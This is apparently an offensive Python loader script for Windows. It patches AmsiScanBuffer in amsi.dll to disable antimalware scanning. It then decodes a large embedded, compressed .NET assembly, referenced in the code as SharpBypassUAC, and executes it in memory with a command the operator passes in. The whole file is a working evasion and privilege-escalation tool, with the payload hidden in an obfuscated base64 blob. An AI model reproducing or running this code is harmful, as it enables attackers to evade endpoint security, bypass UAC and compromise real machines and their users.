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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpBypassUAC.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()